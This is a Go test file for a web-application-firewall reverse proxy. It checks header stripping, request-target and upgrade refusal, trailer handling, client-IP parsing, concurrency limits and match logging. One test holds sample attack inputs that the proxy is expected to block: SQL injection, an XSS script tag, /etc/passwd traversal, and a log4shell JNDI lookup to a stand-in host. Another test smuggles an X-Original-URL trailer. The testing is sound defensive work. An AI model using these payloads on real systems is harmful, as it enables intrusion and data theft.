// SPDX-License-Identifier: Apache-2.0

package proxy

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"net/url"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/YurilLAB/coraza/carnical/crs"
)

// seen is what the application behind the proxy received.
type seen struct {
	RequestURI string
	Host       string
	Header     http.Header
	Trailer    http.Header
	Body       []byte
}

type upstream struct {
	*httptest.Server
	mu   sync.Mutex
	all  []seen
	hold chan struct{} // when set, handlers wait for it to be closed
}

func (u *upstream) requests() []seen {
	u.mu.Lock()
	defer u.mu.Unlock()
	return append([]seen(nil), u.all...)
}

func newUpstream(t testing.TB) *upstream {
	t.Helper()
	u := &upstream{}
	u.Server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		u.mu.Lock()
		u.all = append(u.all, seen{r.RequestURI, r.Host, r.Header.Clone(), r.Trailer.Clone(), body})
		hold := u.hold
		u.mu.Unlock()
		if hold != nil {
			<-hold
		}
		w.Header().Set("Content-Type", "text/plain")
		// What a few paths make the application do, for the tests of the response policy.
		switch {
		case r.URL.Path == "/set-cookie":
			http.SetCookie(w, &http.Cookie{Name: "session", Value: "abc"})
		case r.URL.Path == "/banner":
			w.Header().Set("X-Powered-By", "PHP/8.3.1")
			w.Header().Set("Server", "Apache/2.4.58 (Ubuntu)")
		case strings.HasSuffix(r.URL.Path, ".css"):
			w.Header().Set("Content-Type", "text/html")
		case r.URL.Path == "/cut":
			// An application that dies part way through the body it announced.
			w.Header().Set("Content-Length", "1000")
			w.Write([]byte("part of a body"))
			w.(http.Flusher).Flush()
			panic(http.ErrAbortHandler)
		}
		w.Write([]byte("reached the application"))
	}))
	t.Cleanup(u.Close)
	return u
}

// The test upstreams are on the loopback address, which the edge refuses unless it is allowed.
var loopback = OriginPolicy{Allow: []netip.Prefix{netip.MustParsePrefix("127.0.0.0/8"), netip.MustParsePrefix("::1/128")}}

type setup struct {
	cfg  Config
	up   *upstream
	addr string
	edge *Edge
}

func start(t testing.TB, change func(*Config)) *setup {
	t.Helper()
	up := newUpstream(t)
	target, _ := url.Parse(up.URL)
	cfg := Config{Upstream: target, CRS: crs.DefaultSettings(), Origin: loopback}
	if change != nil {
		change(&cfg)
	}
	e, err := New(cfg)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { e.Close() })
	srv := httptest.NewUnstartedServer(nil)
	srv.Config = e.Server("") // the same limits and settings as a real server
	srv.Start()
	t.Cleanup(srv.Close)
	return &setup{cfg, up, strings.TrimPrefix(srv.URL, "http://"), e}
}

// raw sends exactly these bytes and returns the status of the first response and the whole reply.
func (s *setup) raw(t testing.TB, data string) (int, string) {
	t.Helper()
	return s.rawFor(t, 5*time.Second, data)
}

// rawFor is raw with a limit on how long to wait for the reply (a slow machine, or the race detector, needs more).
func (s *setup) rawFor(t testing.TB, wait time.Duration, data string) (int, string) {
	t.Helper()
	conn, err := net.DialTimeout("tcp", s.addr, 3*time.Second)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(wait))
	if _, err := conn.Write([]byte(data)); err != nil {
		t.Fatal(err)
	}
	var out bytes.Buffer
	io.Copy(&out, conn)
	reply := out.String()
	status := 0
	if resp, err := http.ReadResponse(bufio.NewReader(strings.NewReader(reply)), nil); err == nil {
		status = resp.StatusCode
	}
	return status, reply
}

func get(target string, headers ...string) string {
	return "GET " + target + " HTTP/1.1\r\nHost: shop.example.test\r\nUser-Agent: Mozilla/5.0 Chrome/120\r\nAccept: text/html\r\n" +
		strings.Join(headers, "") + "Connection: close\r\n\r\n"
}

func TestClaimedHeadersNeverReachTheApplicationAndCannotReplaceTheVisitorsAddress(t *testing.T) {
	claims := []string{"X-Original-URL", "X_Original_URL", "X-Rewrite-URL", "X_Rewrite_URL", "X-Forwarded-For", "X_Forwarded_For",
		"X-Real-IP", "X_Real_IP", "Client-IP", "True-Client-IP", "CF-Connecting-IP", "Forwarded", "X-Forwarded-Host", "X_Forwarded_Host",
		"X-Envoy-External-Address", "X-Azure-ClientIP", "X-Host", "Front-End-Https", "Proxy"}
	canonical := map[string]string{"x-forwarded-for": "127.0.0.1", "x-real-ip": "127.0.0.1", "x-forwarded-proto": "http", "x-forwarded-host": "shop.example.test"}
	for _, claim := range claims {
		t.Run(claim, func(t *testing.T) {
			s := start(t, nil)
			status, _ := s.raw(t, get("/page", claim+": 6.6.6.6\r\n", "X_Application_Token: keep\r\n"))
			got := s.up.requests()
			if status == 403 {
				// The rule set itself refused it (the CRS blocks the httpoxy "Proxy" header, for one).
				if len(got) != 0 {
					t.Fatalf("refused, yet %d requests reached the application", len(got))
				}
				return
			}
			if status != 200 || len(got) != 1 {
				t.Fatalf("status %d, %d requests", status, len(got))
			}
			for name, values := range got[0].Header {
				dashed := strings.ReplaceAll(strings.ToLower(name), "_", "-")
				if want, ok := canonical[dashed]; ok {
					if len(values) != 1 || values[0] != want || name != http.CanonicalHeaderKey(dashed) {
						t.Errorf("%s = %v, want exactly %q", name, values, want)
					}
				} else if dashed == strings.ReplaceAll(strings.ToLower(claim), "_", "-") {
					t.Errorf("%s reached the application with %v", name, values)
				}
			}
			if got[0].Header.Get("X_application_token") == "" {
				t.Error("an ordinary header with underscores was dropped")
			}
		})
	}
}

func TestTheTargetReachesTheApplicationExactlyAsSent(t *testing.T) {
	// The three targets with an encoded slash or a path parameter are refused by default (see TestPathPolicy), so they
	// are sent to an edge that has been told to allow them.
	s := start(t, func(c *Config) { c.Paths = PathPolicy{AllowEncodedSlash: true, AllowPathParams: true} })
	for _, target := range []string{
		"/", "/a/b/c", "/a%2fb", "/a%2Fb?x=%2f", "/a;b=c/d", "/caf%C3%A9", "/a?x=1&x=2", "/a?%78=1", "/a%20b?q=a+b",
		"/a?", "/a?x", "/a?x=%zz&y=1", "/search?q=ordinary&page=2",
	} {
		before := len(s.up.requests())
		if status, reply := s.raw(t, get(target)); status != 200 {
			t.Errorf("%s: status %d\n%.200s", target, status, reply)
			continue
		}
		got := s.up.requests()
		if len(got) != before+1 || got[before].RequestURI != target {
			t.Errorf("sent %q, the application received %q", target, got[len(got)-1].RequestURI)
		}
	}
}

func TestTargetsThatCouldNotBeForwardedUnchangedAreRefused(t *testing.T) {
	s := start(t, nil)
	for name, data := range map[string]string{
		"absolute form":             "GET http://shop.example.test/page HTTP/1.1\r\nHost: shop.example.test\r\nConnection: close\r\n\r\n",
		"double slash":              get("//evil.example/x"),
		"a byte Go would re-encode": get("/a%2fb|"),
		"a caret":                   get("/a^b"),
		"CONNECT":                   "CONNECT shop.example.test:443 HTTP/1.1\r\nHost: shop.example.test:443\r\nConnection: close\r\n\r\n",
		"asterisk":                  "OPTIONS * HTTP/1.1\r\nHost: shop.example.test\r\nConnection: close\r\n\r\n",
	} {
		status, _ := s.raw(t, data)
		if status == 200 {
			t.Errorf("%s: status %d", name, status)
		}
	}
	if n := len(s.up.requests()); n != 0 {
		t.Fatalf("%d refused requests reached the application", n)
	}
}

func TestProtocolUpgradesAreRefused(t *testing.T) {
	s := start(t, nil)
	for name, headers := range map[string][]string{
		"websocket":                   {"Connection: Upgrade\r\n", "Upgrade: websocket\r\n", "Sec-WebSocket-Key: x\r\n", "Sec-WebSocket-Version: 13\r\n"},
		"h2c":                         {"Connection: Upgrade, HTTP2-Settings\r\n", "Upgrade: h2c\r\n", "HTTP2-Settings: AAMAAABkAAQAAP__\r\n"},
		"upgrade without Connection":  {"Upgrade: websocket\r\n"},
		"Connection on a second line": {"Connection: keep-alive\r\n", "Connection: Upgrade\r\n", "Upgrade: websocket\r\n"},
	} {
		if status, _ := s.raw(t, get("/ws", headers...)); status != http.StatusNotImplemented {
			t.Errorf("%s: status %d, want 501", name, status)
		}
	}
	if n := len(s.up.requests()); n != 0 {
		t.Fatalf("%d upgrade requests reached the application", n)
	}
}

func TestTrailersAreNotForwarded(t *testing.T) {
	s := start(t, nil)
	data := "POST /submit HTTP/1.1\r\nHost: shop.example.test\r\nUser-Agent: Mozilla/5.0 Chrome/120\r\nAccept: text/html\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nTrailer: X-Original-URL, X-Late\r\nConnection: close\r\n\r\n" +
		"6\r\na=1&b=\r\n1\r\n2\r\n0\r\nX-Original-URL: /admin\r\nX-Late: hello\r\n\r\n"
	if status, reply := s.raw(t, data); status != 200 {
		t.Fatalf("status %d\n%.300s", status, reply)
	}
	got := s.up.requests()
	if len(got) != 1 || len(got[0].Trailer) != 0 || got[0].Header.Get("X-Original-Url") != "" || got[0].Header.Get("X-Late") != "" {
		t.Fatalf("trailers reached the application: %+v", got)
	}
	if string(got[0].Body) != "a=1&b=2" {
		t.Fatalf("body changed: %q", got[0].Body)
	}
}

func TestClientIdentity(t *testing.T) {
	trusted, err := ParseTrusted("10.0.0.0/8, 2001:db8:ff::/48")
	if err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		name, peer string
		chain      []string
		want       string
		bad        bool
	}{
		{"direct visitor claiming another address", "203.0.113.10:1234", []string{"198.51.100.90"}, "203.0.113.10", false},
		{"direct visitor sending garbage", "203.0.113.10:1234", []string{"junk"}, "203.0.113.10", false},
		{"visitor behind a trusted proxy", "10.0.0.1:1234", []string{"198.51.100.10, 10.0.0.2"}, "198.51.100.10", false},
		{"a forged address on the left is ignored", "10.0.0.1:1234", []string{"1.2.3.4, 198.51.100.10, 10.0.0.2"}, "198.51.100.10", false},
		{"several header lines are one chain", "10.0.0.1:1234", []string{"198.51.100.10", "203.0.113.7, 10.0.0.2"}, "203.0.113.7", false},
		{"trusted proxy sent no chain", "10.0.0.1:1234", nil, "10.0.0.1", false},
		{"garbage at the end of a trusted chain", "10.0.0.1:1234", []string{"198.51.100.10, junk"}, "", true},
		{"empty entry", "10.0.0.1:1234", []string{"198.51.100.10,"}, "", true},
		{"a port is not an address", "10.0.0.1:1234", []string{"198.51.100.10:80"}, "", true},
		{"an IPv4-mapped address is the IPv4 address", "10.0.0.1:1234", []string{"::ffff:198.51.100.10"}, "198.51.100.10", false},
		{"IPv6 behind a trusted IPv6 proxy", "[2001:db8:ff::5]:1234", []string{"2001:db8:1::9"}, "2001:db8:1::9", false},
		{"a chain made only of trusted proxies", "10.0.0.1:1234", []string{"10.0.0.9, 10.0.0.2"}, "10.0.0.9", false},
		{"a chain over 64 entries", "10.0.0.1:1234", []string{strings.Repeat("1.1.1.1,", 70) + "1.1.1.1"}, "", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r := httptest.NewRequest("GET", "/", nil)
			r.RemoteAddr = tc.peer
			for _, line := range tc.chain {
				r.Header.Add("X-Forwarded-For", line)
			}
			addr, _, err := clientAddr(r, trusted)
			if (err != nil) != tc.bad {
				t.Fatalf("error = %v", err)
			}
			if !tc.bad && addr.String() != tc.want {
				t.Fatalf("got %s, want %s", addr, tc.want)
			}
		})
	}
}

func TestTrustedProxyRangesAreChecked(t *testing.T) {
	for _, bad := range []string{"0.0.0.0/0", "::/0", "::ffff:10.0.0.0/104", "10.0.0.0/33", "not-an-address", "fe80::1%eth0"} {
		if _, err := ParseTrusted(bad); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
	for _, good := range []string{"10.0.0.1", "10.0.0.0/8", "0.0.0.0/1", "2001:db8::/32", "127.0.0.1, ::1"} {
		if _, err := ParseTrusted(good); err != nil {
			t.Errorf("%q refused: %v", good, err)
		}
	}
	trusted, _ := ParseTrusted("127.0.0.1")
	s := start(t, func(c *Config) { c.TrustedProxies = trusted })
	s.raw(t, get("/page", "X-Forwarded-For: 198.51.100.10\r\n"))
	got := s.up.requests()
	if len(got) != 1 || got[0].Header.Get("X-Real-Ip") != "198.51.100.10" {
		t.Fatalf("a trusted proxy's visitor address was not used: %+v", got)
	}
	if status, _ := s.raw(t, get("/page", "X-Forwarded-For: garbage\r\n")); status != http.StatusBadRequest {
		t.Fatalf("garbage from a trusted proxy: %d, want 400", status)
	}
	var invalid = netip.MustParsePrefix("0.0.0.0/0")
	target, _ := url.Parse("http://127.0.0.1:1")
	if _, err := New(Config{Upstream: target, CRS: crs.DefaultSettings(), Origin: loopback, TrustedProxies: []netip.Prefix{invalid}}); err == nil {
		t.Fatal("New accepted a /0 trusted range")
	}
}

func TestTheUpstreamAddressIsChecked(t *testing.T) {
	for _, bad := range []string{"ftp://x", "http://", "http://u:p@host", "http://host/app", "http://host?x=1", "http://host#f", "file:///etc/passwd", "//host", ""} {
		u, _ := url.Parse(bad)
		if _, err := New(Config{Upstream: u, CRS: crs.DefaultSettings()}); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
	for _, good := range []string{"http://127.0.0.1:8080", "https://origin.example.com", "http://origin.example.com/"} {
		u, _ := url.Parse(good)
		e, err := New(Config{Upstream: u, CRS: crs.DefaultSettings(), Origin: loopback})
		if err != nil {
			t.Errorf("%q refused: %v", good, err)
			continue
		}
		e.Close()
	}
	if _, err := New(Config{Upstream: &url.URL{Scheme: "http", Host: "h"}, CRS: crs.Settings{}}); err == nil {
		t.Error("empty CRS settings accepted")
	}
}

func TestAttacksAreStoppedAndTheApplicationNeverHearsOfThem(t *testing.T) {
	s := start(t, nil)
	post := func(target, contentType, body string) string {
		return fmt.Sprintf("POST %s HTTP/1.1\r\nHost: shop.example.test\r\nUser-Agent: Mozilla/5.0 Chrome/120\r\nAccept: text/html\r\nContent-Type: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
			target, contentType, len(body), body)
	}
	attacks := map[string]string{
		"sql injection":      get("/search?q=" + url.QueryEscape("1' OR '1'='1' --")),
		"xss":                get("/search?q=" + url.QueryEscape("<script>alert(1)</script>")),
		"path traversal":     get("/download?f=" + url.QueryEscape("../../../../etc/passwd")),
		"log4shell":          get("/", "X-Api-Version: ${jndi:ldap://evil.example/a}\r\n"),
		"scanner":            get("/", "User-Agent: sqlmap/1.7\r\n"),
		"json sql injection": post("/api", "application/json", `{"q":"1' OR '1'='1' --"}`),
		"form sql injection": post("/login", "application/x-www-form-urlencoded", "user=admin'--&pass=x"),
	}
	for name, data := range attacks {
		if status, _ := s.raw(t, data); status != 403 {
			t.Errorf("%s: status %d, want 403", name, status)
		}
	}
	if n := len(s.up.requests()); n != 0 {
		t.Fatalf("%d attacks reached the application", n)
	}
	// And ordinary traffic still passes, with the body intact.
	body := "name=Alice&note=" + url.QueryEscape("O'Brien said: 100% sure, see https://example.com/a?b=c")
	if status, reply := s.raw(t, post("/profile", "application/x-www-form-urlencoded", body)); status != 200 {
		t.Fatalf("ordinary form: %d\n%.300s", status, reply)
	}
	got := s.up.requests()
	if len(got) != 1 || string(got[0].Body) != body {
		t.Fatalf("the body changed on the way: %+v", got)
	}
}

func TestMatchesAreReportedWithoutWhatTheVisitorSentUnlessAsked(t *testing.T) {
	var mu sync.Mutex
	var plain, detailed []Match
	collect := func(into *[]Match) func(Match) {
		return func(m Match) { mu.Lock(); *into = append(*into, m); mu.Unlock() }
	}
	const expanded = "SecRule ARGS:note \"@rx .\" \"id:5000099,phase:2,deny,status:403,log,msg:'request=%{ARGS.note}',logdata:'%{ARGS.note}'\""
	a := start(t, func(c *Config) { c.OnMatch = collect(&plain); c.CRS.After = expanded })
	b := start(t, func(c *Config) { c.OnMatch = collect(&detailed); c.CRS.After = expanded; c.LogDetails = true })
	secret := "SECRETMARK-4711"
	attack := get("/search?q=" + url.QueryEscape("1' OR '"+secret+"'='"+secret+"' --"))
	a.raw(t, attack)
	b.raw(t, attack)
	if status, _ := a.raw(t, get("/search?q="+url.QueryEscape("' or true() or '"+secret+"'='b"))); status != 403 {
		t.Fatalf("local rule status %d", status)
	}
	// Macro-expanded messages can contain request data even when logdata and URI are omitted.
	for _, s := range []*setup{a, b} {
		if status, _ := s.raw(t, get("/profile?note="+secret)); status != 403 {
			t.Fatalf("macro rule status %d", status)
		}
		s.up.Close()
		if status, _ := s.raw(t, get("/health?trace="+secret)); status != 502 {
			t.Fatalf("unavailable origin status %d", status)
		}
	}
	mu.Lock()
	defer mu.Unlock()
	if len(plain) == 0 || len(detailed) == 0 {
		t.Fatalf("no matches reported (%d, %d)", len(plain), len(detailed))
	}
	localLabel, upstreamLabel := false, false
	for _, m := range plain {
		localLabel = localLabel || m.RuleID == 5006001 && m.Message == "XPath predicate injection syntax"
		upstreamLabel = upstreamLabel || m.RuleID == idUpstreamFailed && strings.HasPrefix(m.Message, "upstream ")
		text := fmt.Sprintf("%+v", m)
		if strings.Contains(text, secret) || strings.Contains(text, "127.0.0.1") || m.ClientIP != "" || m.URI != "" || m.Data != "" || m.ExpandedMessage != "" {
			t.Errorf("a default match carries request data: %+v", m)
		}
		if m.RuleID == 0 || m.Message == "" {
			t.Errorf("a match without a rule: %+v", m)
		}
	}
	if !localLabel {
		t.Error("local rule has no safe family label")
	}
	if !upstreamLabel {
		t.Error("upstream failure has no safe operational label")
	}
	found, expandedFound, upstreamDetails := false, false, false
	for _, m := range detailed {
		found = found || strings.Contains(m.URI, secret) || strings.Contains(m.Data, secret)
		expandedFound = expandedFound || m.RuleID == 5000099 && strings.Contains(m.ExpandedMessage, secret)
		upstreamDetails = upstreamDetails || m.RuleID == idUpstreamFailed && strings.Contains(m.URI, secret) && m.ExpandedMessage != ""
	}
	if !found || !expandedFound || !upstreamDetails {
		t.Error("LogDetails did not add the request details")
	}
}

func TestAStalledUploadDoesNotUseUpAnUpstreamPlace(t *testing.T) {
	s := start(t, func(c *Config) { c.MaxUpstreamInFlight = 1 })
	// A client announces a body and never sends it.
	stalled, err := net.Dial("tcp", s.addr)
	if err != nil {
		t.Fatal(err)
	}
	defer stalled.Close()
	fmt.Fprintf(stalled, "POST /upload HTTP/1.1\r\nHost: shop.example.test\r\nUser-Agent: Mozilla/5.0 Chrome/120\r\nAccept: text/html\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100000\r\n\r\na=")
	time.Sleep(300 * time.Millisecond)
	if status, _ := s.raw(t, get("/page")); status != 200 {
		t.Fatalf("an ordinary request while an upload stalled: %d", status)
	}
}

func TestOnlyTheConfiguredNumberOfRequestsReachTheUpstreamAtOnce(t *testing.T) {
	s := start(t, func(c *Config) { c.MaxUpstreamInFlight = 1 })
	hold := make(chan struct{})
	s.up.mu.Lock()
	s.up.hold = hold
	s.up.mu.Unlock()
	first := make(chan int, 1)
	go func() { status, _ := s.raw(t, get("/slow")); first <- status }()
	deadline := time.Now().Add(3 * time.Second)
	for len(s.up.requests()) == 0 && time.Now().Before(deadline) {
		time.Sleep(10 * time.Millisecond)
	}
	status, reply := s.raw(t, get("/second"))
	if status != http.StatusServiceUnavailable || !strings.Contains(reply, "Retry-After: 1") {
		t.Errorf("second request while the place was taken: %d\n%.200s", status, reply)
	}
	close(hold)
	if got := <-first; got != 200 {
		t.Errorf("the first request: %d", got)
	}
	if status, _ := s.raw(t, get("/third")); status != 200 {
		t.Errorf("after the place was freed: %d", status)
	}
}

func TestTheReverseProxysOwnLinesGoToItsErrorLog(t *testing.T) {
	var mu sync.Mutex
	var lines strings.Builder
	s := start(t, func(c *Config) {
		c.ErrorLog = log.New(writerFunc(func(p []byte) (int, error) {
			mu.Lock()
			defer mu.Unlock()
			return lines.Write(p)
		}), "", 0)
	})
	s.raw(t, get("/cut"))
	mu.Lock()
	defer mu.Unlock()
	if !strings.Contains(lines.String(), "ReverseProxy read error during body copy") {
		t.Fatalf("a body cut short by the application was not reported to ErrorLog: %q", lines.String())
	}
}

type writerFunc func([]byte) (int, error)

func (f writerFunc) Write(p []byte) (int, error) { return f(p) }

func TestTheUpstreamHostCanBePinned(t *testing.T) {
	plain := start(t, nil)
	pinned := start(t, func(c *Config) { c.UpstreamHost = "origin.internal" })
	plain.raw(t, get("/page"))
	pinned.raw(t, get("/page"))
	if got := plain.up.requests(); len(got) != 1 || got[0].Host != "shop.example.test" {
		t.Errorf("by default the visitor's Host is kept: %+v", got)
	}
	if got := pinned.up.requests(); len(got) != 1 || got[0].Host != "origin.internal" {
		t.Errorf("a pinned Host is used whatever the visitor sent: %+v", got)
	}
}
